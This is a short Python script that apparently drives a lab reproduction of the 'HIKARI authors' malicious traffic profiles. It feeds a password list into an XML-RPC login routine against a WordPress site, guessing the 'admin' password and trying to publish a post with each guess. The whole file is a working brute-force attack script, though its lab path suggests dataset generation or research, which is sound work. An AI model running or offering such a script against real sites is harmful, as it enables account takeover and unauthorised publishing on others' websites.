"""Drive the HIKARI authors' loginX (XML-RPC login through wordpress_xmlrpc, trying to publish a post)."""

import sys

sys.path.insert(0, "/lab/profiles/malicious")
from AutoSignPost import AutoSignPost  # noqa: E402


def main(url: str, passwords: str, attempts: int, start: int) -> None:
    guesses = [line.strip() for line in open(passwords) if line.strip()][start:start + attempts]
    tool = AutoSignPost()
    for password in guesses:
        try:
            tool.loginX(url, "admin", password, "title", "content")
        except Exception as error:
            print("attempt failed:", type(error).__name__)


if __name__ == "__main__":
    main(sys.argv[1], sys.argv[2], int(sys.argv[3]), int(sys.argv[4]))
